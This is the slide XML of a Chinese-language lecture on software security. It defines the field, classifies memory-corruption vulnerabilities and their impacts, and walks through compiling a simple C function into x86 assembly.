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340" r:id="rId3"/>
    <p:sldId id="342" r:id="rId4"/>
    <p:sldId id="341" r:id="rId5"/>
    <p:sldId id="296" r:id="rId6"/>
    <p:sldId id="297" r:id="rId7"/>
    <p:sldId id="298" r:id="rId8"/>
    <p:sldId id="299" r:id="rId9"/>
    <p:sldId id="300" r:id="rId10"/>
    <p:sldId id="364" r:id="rId11"/>
    <p:sldId id="365" r:id="rId12"/>
    <p:sldId id="366" r:id="rId13"/>
    <p:sldId id="367" r:id="rId14"/>
    <p:sldId id="301" r:id="rId15"/>
    <p:sldId id="370" r:id="rId16"/>
    <p:sldId id="302" r:id="rId17"/>
    <p:sldId id="321" r:id="rId18"/>
    <p:sldId id="322" r:id="rId19"/>
    <p:sldId id="323" r:id="rId20"/>
    <p:sldId id="324" r:id="rId21"/>
    <p:sldId id="325" r:id="rId22"/>
    <p:sldId id="326" r:id="rId23"/>
    <p:sldId id="259" r:id="rId24"/>
    <p:sldId id="275" r:id="rId25"/>
    <p:sldId id="276" r:id="rId26"/>
    <p:sldId id="277" r:id="rId27"/>
    <p:sldId id="278" r:id="rId28"/>
    <p:sldId id="279" r:id="rId29"/>
    <p:sldId id="288" r:id="rId30"/>
    <p:sldId id="289" r:id="rId31"/>
    <p:sldId id="290" r:id="rId32"/>
    <p:sldId id="291" r:id="rId33"/>
    <p:sldId id="281" r:id="rId34"/>
    <p:sldId id="282" r:id="rId35"/>
    <p:sldId id="283" r:id="rId36"/>
    <p:sldId id="284" r:id="rId37"/>
    <p:sldId id="285" r:id="rId38"/>
    <p:sldId id="286" r:id="rId39"/>
    <p:sldId id="261" r:id="rId40"/>
    <p:sldId id="343" r:id="rId41"/>
    <p:sldId id="263" r:id="rId42"/>
    <p:sldId id="345" r:id="rId43"/>
    <p:sldId id="346" r:id="rId44"/>
    <p:sldId id="360" r:id="rId45"/>
    <p:sldId id="350" r:id="rId46"/>
    <p:sldId id="352" r:id="rId47"/>
    <p:sldId id="362" r:id="rId48"/>
    <p:sldId id="361" r:id="rId49"/>
    <p:sldId id="357" r:id="rId50"/>
    <p:sldId id="363" r:id="rId51"/>
    <p:sldId id="274" r:id="rId52"/>
    <p:sldId id="368" r:id="rId53"/>
    <p:sldId id="369" r:id="rId54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FCF"/>
    <a:srgbClr val="FF66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8"/>
    <p:restoredTop sz="95701" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0" snapToObjects="1">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="103" d="100"/>
          <a:sy n="103" d="100"/>
        </p:scale>
        <p:origin x="13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39B8F-D5D7-244B-BD23-6F0922325337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C0114-B5FC-4244-B5BC-93289FD5FF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350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B5F381-4586-9D45-B901-10057FD76898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9667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B5F381-4586-9D45-B901-10057FD76898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6208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格式化字符串漏洞比较容易定位及修补，越来越少</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0" smtClean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B5F381-4586-9D45-B901-10057FD76898}" type="slidenum">
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:t>41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499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442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2565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515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111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583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6848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182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2411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96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640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4291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A369B-85F8-394C-8E89-895F90DDF7DD}" type="datetimeFigureOut">
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:t>15/10/29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706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b="1" dirty="0" smtClean="0"/>
              <a:t>软件安全</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN" altLang="en-US" b="1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864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什么是软件安全？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软件安全专注于研究软件</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的设计和实现</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>的安全</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>研究对象：代码（源码、字节码、汇编等）</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>研究目标：减少软件漏洞</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>研究技术：逆向工程，漏洞挖掘</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:t>与利用，防御技术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48396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软件漏洞的分类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分类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逻辑漏洞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输入验证、认证授权、访问控制等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内存破坏漏洞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缓冲区溢出</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>（Buffer Overflow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整数溢出（</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>Integer Overflow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格式化字符串（</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>Format String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释放后使用（</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>Use-After-Free</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>）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332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内存破坏漏洞危害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ios</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>内核漏洞 </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>=&gt;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iphone</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>越狱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linux</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>内核漏洞 </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>=&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>linux</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>/Android</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>本地提权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openssl</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>漏洞（心脏出血）</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>=&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>泄露敏感信息</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>浏览器漏洞 </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>=&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>远程代码执行，系统沦陷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nginx</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>漏洞 </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>=&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>远程代码执行，拖库</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>路由器远程漏洞 </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>=&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>中间人攻击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965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如何理解漏洞并利用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 smtClean="0"/>
              <a:t>理解程序运行过程（理解</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>ABI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可执行文件的创建过程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编译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链接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可执行文件的结构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PE/ELF</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>可执行程序的加载和动态链接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可执行程序的运行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汇编指令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调用约定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内存布局</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>练习，积累经验和技巧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4918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从</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>C</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>语言到可执行文件</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0"/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641805" y="1775971"/>
            <a:ext cx="1186996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zh-CN" i="1" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" i="1" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>代码</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" i="1" dirty="0">
              <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
            </a:endParaRPr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1101725" y="2917071"/>
            <a:ext cx="727075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i="1" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>汇编</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" i="1" dirty="0">
              <a:latin typeface="Calibri" pitchFamily="34" charset="0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828675" y="3985771"/>
            <a:ext cx="1000125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i="1" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>二进制</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" i="1" dirty="0">
              <a:latin typeface="Calibri" pitchFamily="34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828675" y="5128771"/>
            <a:ext cx="1000125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i="1" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>二进制</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" i="1" dirty="0">
              <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Line 6"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3989388" y="2238604"/>
            <a:ext cx="0" cy="68036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4186535" y="2385571"/>
            <a:ext cx="25019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000" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>编译器</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>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ourier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -S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4170660" y="3452371"/>
            <a:ext cx="30480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000" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>汇编器</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>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alibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>as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4186535" y="4595371"/>
            <a:ext cx="263842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000" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>连接器</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>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alibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> or</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ld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2373313" y="1841059"/>
            <a:ext cx="3263900" cy="397545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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>代码</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>p1.c p2.c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31" name="Rectangle 11"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2259013" y="2918971"/>
            <a:ext cx="3492500" cy="397545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latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Asm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>代码</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>p1.s p2.s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2144713" y="4061971"/>
            <a:ext cx="3721100" cy="3975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Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>对象</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>p1.o p2.o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2131219" y="5204971"/>
            <a:ext cx="3748088" cy="397545"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF99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Executable </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>可执行文件</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>p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34" name="Line 14"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3989388" y="3316516"/>
            <a:ext cx="0" cy="7264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5" name="Line 15"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3989388" y="4459516"/>
            <a:ext cx="0" cy="7264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6" name="Rectangle 16"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6858000" y="4061971"/>
            <a:ext cx="2044700" cy="10130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dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>静态库</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0">
              <a:latin typeface="Calibri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dirty="0" smtClean="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Static </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>libraries (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.a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37" name="Line 17"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="1">
            <a:off x="5865813" y="4595371"/>
            <a:ext cx="9906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78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编译与链接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 smtClean="0"/>
              <a:t>编译器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将</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>C</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>语言代码转换成汇编代码</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>汇编器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将汇编（</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>.s</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>文件）变成对象（</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>.o</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>文件）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对每条汇编指令编码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生成的对象文件接近可执行文件，缺少不同对象文件之间的关联</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>链接器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解析文件之间的引用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静态链接静态库文件（</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>.a</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>文件）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为动态链接做准备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5865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编译：从</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>C</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>语言到汇编</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN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04800" y="2883642"/>
            <a:ext cx="3883025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nsolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>int</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>sum(int</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>int</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin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nsolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>{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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>int</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>t = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>x + y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas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nsolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>  return </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas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495800" y="2875705"/>
            <a:ext cx="4195763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nsolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>sum:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0" smtClean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 push </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>ebp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0" smtClean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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>mov</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>ebp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>esp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0" smtClean="0">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>mov</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>eax</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>[ebp+12]</a:t>
            </a:r>
